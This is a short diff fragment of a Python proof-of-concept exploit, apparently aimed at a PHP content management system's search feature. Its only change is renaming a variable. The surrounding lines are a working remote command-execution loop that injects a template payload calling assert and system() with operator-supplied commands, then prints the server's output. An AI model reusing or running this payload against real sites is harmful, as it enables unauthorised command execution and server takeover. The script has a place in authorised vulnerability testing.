@@ -13,14 +13,14 @@ def poc():
 				command = raw_input("[*] input the command:")
 				payload= 'system("%s")' % command
 				if command != "exit":
-					postdata = {
+					postData = {
 						"searchtype":"5",
 						"searchword":"d",
 						"order":"}{end if}{if:1)print_r($_POST[func]($_POST[cmd]));//}{end if}",
 						"func":"assert",
 						"cmd": payload,
 					}
-					r = requests.post(target.url,data=postdata)
+					r = requests.post(target.url,data=postData)
 					print(r.text[:r.text.find("<!DOCTYPE html>")].encode(r.encoding))
 				else:
 					break
